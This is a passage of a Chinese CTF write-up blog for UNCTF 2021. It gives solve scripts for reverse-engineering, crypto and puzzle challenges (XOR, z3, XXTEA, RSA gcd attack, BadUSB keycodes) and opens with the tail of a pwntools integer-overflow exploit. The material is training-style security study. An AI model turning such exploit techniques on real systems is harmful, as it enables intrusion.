class="string">&#x27;2147483647&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483647&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="# Reverse"></a># Reverse</h2><h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><blockquote><p>程序流程识别，算法逆向</p></blockquote><p><code>login()</code> 中 <code>pqsd`fl&#123;zmpZsag&#125;wdYVkUNC</code> 与 <code>0x16</code> 异或得到 <code>fgervpzml&#123;fLewqkarO@&#125;CXU</code>，再8位一组上下排列，从上往下取出连成：<code>flag&#123;refOrL@ve&#125;pwCzqXmkU</code>。</p><p>flag：<code>flag&#123;refOrL@ve&#125;</code></p><p>​    </p><h3 id="rejunk"><a href="#rejunk" class="headerlink" title="rejunk"></a>rejunk</h3><blockquote><p>垃圾代码混淆，异或算法逆向</p></blockquote><p>查看伪代码发现夹进很多垃圾代码，跟进几行有用的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__main();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input your answer:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v14);</span><br><span class="line"><span class="built_in">sprintf</span>(Buffer, <span class="string">&quot;%s%s%s%s&quot;</span>, <span class="string">&quot;WQGUL&quot;</span>, <span class="string">&quot;xb&gt;2:&quot;</span>, <span class="string">&quot;ooh95=&quot;</span>, <span class="string">&quot;&#x27;&#x27;twk&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( (v9 ^ (v14[v9] + <span class="number">2</span>)) != Buffer[v9] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>脚本逆解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;&#x27;&#x27;WQGULxb&gt;2:ooh95=&#x27;&#x27;twk&#x27;&#x27;&#x27;</span>)</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    t.append((s[i]^i)-<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;b781cbb29054db&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>UNCTF&#123;b781cbb29054db&#125;</code></p><p>​    </p><h3 id="py-trade"><a href="#py-trade" class="headerlink" title="py_trade"></a>py_trade</h3><blockquote><p>EZ opcode! Give me your PY, and i’ll give you flag!</p></blockquote><p>还原python字节码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;XXXXXX&#x27;</span></span><br><span class="line">num = [<span class="number">0</span>]*<span class="number">18</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    num[i] = (<span class="built_in">ord</span>(flag[i])+i)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    num[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>] = (<span class="built_in">ord</span>(flag[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>])+<span class="built_in">len</span>(flag)-i-<span class="number">1</span>)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="comment">#[115, 120, 96, 84, 116, 103, 105, 56, 102, 59, 127, 105, 115, 128, 95, 124, 139, 49]</span></span><br></pre></td></tr></table></figure><p>用z3解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">num = [<span class="number">115</span>, <span class="number">120</span>, <span class="number">96</span>, <span class="number">84</span>, <span class="number">116</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">59</span>, <span class="number">127</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">128</span>, <span class="number">95</span>, <span class="number">124</span>, <span class="number">139</span>, <span class="number">49</span>]</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag%d&#x27;</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num))]</span><br><span class="line">res = [-<span class="number">1</span>]*<span class="built_in">len</span>(num)</span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    res[i] = (flag[i]+i)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    res[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>] = (flag[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>]+<span class="built_in">len</span>(flag)-i-<span class="number">1</span>)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    s.add(res[i]==num[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(m[i].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># py_Trad3_1s_fuNny!</span></span><br></pre></td></tr></table></figure><p>flag：<code>unctf&#123;py_Trad3_1s_fuNny!&#125;</code></p><p>​    </p><h3 id="ezDriver"><a href="#ezDriver" class="headerlink" title="ezDriver"></a>ezDriver</h3><blockquote><p>你了解过驱动嘛？试试看吧！</p></blockquote><p>分析逻辑，<code>DriverEntry()</code> -&gt; <code>sub_140086000()</code> -&gt; <code>sub_140085268()</code> -&gt; <code>sub_140085000()</code> -&gt; <code>sub_140085020()</code>。</p><p>主程序逻辑在 <code>sub_140085020()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140085020</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">void</span> *Address, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+20h] [rbp-828h]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">2048</span>]; <span class="comment">// [rsp+30h] [rbp-818h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_140001640(v10, <span class="number">0</span>i64, <span class="number">2048</span>i64);</span><br><span class="line">  ProbeForRead(Address, <span class="number">0x800</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">void</span> *)Address);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, a2);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, v10);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="number">0x800</span>ui64);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  LODWORD(v9) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> __int64)v4 &lt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_140083090[v4] = v10[<span class="number">4</span> * v4];</span><br><span class="line">    LODWORD(v9) = ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140001000(byte_140083090, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_140003028, &amp;unk_140003030);<span class="comment">// XXTEA加密</span></span><br><span class="line">  v5 = <span class="number">-1</span>i64;</span><br><span class="line">  v6 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v6;</span><br><span class="line">  <span class="keyword">while</span> ( byte_140003000[v6] );</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v5;</span><br><span class="line">  <span class="keyword">while</span> ( byte_140083090[v5] );</span><br><span class="line">  <span class="keyword">if</span> ( v5 == v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    HIDWORD(v9) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v8 &lt; v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_140003000[v8] != byte_140083090[v8] )<span class="comment">// 比较</span></span><br><span class="line">      &#123;</span><br><span class="line">        DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] flag wrong!&quot;</span>, byte_140003000, v9);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">      HIDWORD(v9) = ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] you are right@&quot;</span>, byte_140003000, v9);</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);</span><br><span class="line">    sub_140001380(v10, Address, a2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] flag Wrong!&quot;</span>, byte_140003000, v9);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现通过加密函数 <code>sub_140001000()</code> 后，得到的结果 <code>byte_140083090</code> 与 <code>byte_140003000</code> 作比较。</p><p>跟进加密函数 <code>sub_140001000()</code>，由特征知为XXTEA加密算法，使用的key为 <code>unk_140003030=[1,2,3,4]</code>。</p><p>脚本解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    s = <span class="string">&#x27;184E8E7F2E69B702EEAA503990DEE59FAE4C4D06937164208B0234B83CA1884A21671A3783D1F2B1&#x27;</span></span><br><span class="line">    s = [s[<span class="number">8</span>*k:<span class="number">8</span>*k+<span class="number">8</span>] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">8</span>)]</span><br><span class="line">    s = [<span class="built_in">bytes</span>.fromhex(k)[::-<span class="number">1</span>].<span class="built_in">hex</span>() <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line">    encrypted = [<span class="built_in">int</span>(k,<span class="number">16</span>) <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    decrypted = [<span class="built_in">hex</span>(k)[<span class="number">2</span>:] <span class="keyword">for</span> k <span class="keyword">in</span> decrypted][:-<span class="number">1</span>]</span><br><span class="line">    flag = [<span class="built_in">bytes</span>.fromhex(k)[::-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> decrypted]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;Do_you_want_to_a_cup_of_tea?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>unctf&#123;Do_you_want_to_a_cup_of_tea?&#125;</code></p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="# Crypto"></a># Crypto</h2><h3 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h3><blockquote><p>简单的RSA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">q= <span class="number">9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471</span></span><br><span class="line">p= <span class="number">12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101</span></span><br><span class="line">c= <span class="number">28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225</span></span><br><span class="line">e = <span class="number">65537</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA基操。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">q = <span class="number">9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471</span></span><br><span class="line">p =  <span class="number">12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101</span></span><br><span class="line">c = <span class="number">28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,fn)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;Th1s_1s_f1ag_f0r_unctf_2021!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="探秘中世纪城堡"><a href="#探秘中世纪城堡" class="headerlink" title="探秘中世纪城堡"></a>探秘中世纪城堡</h3><blockquote><p>贝拉在参观一个中世纪的古堡时，在桌上看到了一串一奇怪的字符和描述。你能帮大聪明破解皇珈骑士留下来的谜团吗？</p><p>年轻的大帝率领着64位皇珈骑士冲破了双重阻栏夺下了城池。<br>AZSLh2OofBA0C2qzi25mg2KsYqW7iCSdDq9aBLKsDBWyi259</p></blockquote><p>ROT21+base64+栅栏2。</p><p>flag：<code>UNCTF&#123;subscribe_to_Xiangwandamowang&#125;</code></p><p>​    </p><h3 id="分析badusb流量"><a href="#分析badusb流量" class="headerlink" title="分析badusb流量"></a>分析badusb流量</h3><blockquote><p>一日，某企业的安全管理员发现企业中的电脑遭到了badusb的侵害，以下他分离出来的有问题USB流量，而这似乎跟键盘的键位映射有关。</p><p>2018 2011 2006 2017 2009 202f 201C 0027 0018 002D 2004 0015 0008 002D 0019 0008 0015 001C 002D 0011 001E 0006 0008 2030</p></blockquote><p>键盘键位映射规则，映射关系参考<a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html">《USB键盘协议中键码》中的HID Usage ID</a>。</p><p>前两位20代表大写，10代表小写，后两位为键码，对照写flag。</p><p>flag：<code>UNCTF&#123;Y0u-Are-very-n1ce&#125;</code></p><p>​    </p><h3 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag=<span class="string">&quot;unctf&#123;&quot;</span>+<span class="built_in">str</span>(uuid.uuid4())+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">m=libnum.s2n(flag)</span><br><span class="line"></span><br><span class="line">p=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">q=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m*p+n,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="comment">#n= 27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141</span></span><br><span class="line"><span class="comment">#c= 3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059</span></span><br><span class="line"><span class="comment">#e= 65537</span></span><br></pre></td></tr></table></figure></blockquote><p>$c = (mp+n)^e \% n = p^e(m+q)^e \% n $，</p><p>有 $c\%p = p^e(m+q)^e \% p = \Big((p^e \% p)\big((m+q)^e \% p\big)\Big) \% p=0$，</p><p>故 $c=kp$，又 $n=pq$，则 $p=\gcd(c,n)$。</p><p>求出 $d \equiv e^{-1} \pmod {\varphi(n)}$，可以得到 $m’ = mp+n = c^d \% n$，所以 $m = \cfrac{m’-n}{p}$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141</span></span><br><span class="line">c = <span class="number">3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = gcd(n,c)</span><br><span class="line">q = n//p</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,fn)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n)-n)//p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;rsa_s1mp1e_0kk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>unctf&#123;rsa_s1mp1e_0kk&#125;</code></p><p>​    </p><h3 id="电信诈骗pro"><a href="#电信诈骗pro" class="headerlink" title="电信诈骗pro"></a>电信诈骗pro</h3><blockquote><p>朕是秦始皇，其实朕没有死，朕在西安兵马俑第四个坑第七排，朕是吃了长生不老药的，朕告诉你啊，朕在陕西有3000吨黄金和300万秦兵被封印，现在只需要30元就能解封，只要你打钱给朕，朕明天直接带部队复活，让你统领三军!建立像古罗马一样的帝国，君无戏言！ 朕的账户是<code>5.#4&amp;;Sw)2Ti%*Sj1eUU9kTwi*Sj)1S&quot;a8S0)6x-8(x7=</code></p><p>flag格式为unctf{}</p></blockquote><p>尝试异或爆破，发现异或0x40有 <code>unctf&#123;.7ir.)ej.*q%..y+.7)j.*iq.b!x.piv8mxh8w&#125;</code>，说明中间加密方式不同。</p><p>提取中间部分尝试出是ROT47+凯撒17：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;$HXa%:TY$;`6&amp;&amp;h&lt;%H:Y$;X`$Q2g$_XeI\gWIf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">200</span>,<span class="number">200</span>):</span><br><span class="line">    t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(s[j])+i &gt;=<span class="number">32</span> <span class="keyword">and</span> <span class="built_in">ord</span>(s[j])+i&lt;<span class="number">127</span>:</span><br><span class="line">            t+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[j])+i)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(t)==<span class="built_in">len</span>(s):</span><br><span class="line">        <span class="built_in">print</span>(i,t)</span><br></pre></td></tr></table></figure><p>其中 <code>5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw</code> base64解码是 <code>别解了，那个就是flag</code>。</p><p>flag：<code>unctf&#123;5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw&#125;</code></p><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="# Misc"></a># Misc</h2><h3 id="简单日志审计"><a href="#简单日志审计" class="headerlink" title="简单日志审计"></a>简单日志审计</h3><blockquote><p>相传，在某一归隐门派的服务器里存在着众多盖世绝学，谁掌握了任一一本绝学谁就能一统CTF江湖，突然有一天门派的长老发现服务器的日志里存在着些许异常，或许这门绝学已经失窃了，请帮帮长老找出失窃的是哪一本绝学吧。flag格式为UNCTF{*}</p></blockquote><p>日志文件里找到base64编码字符串 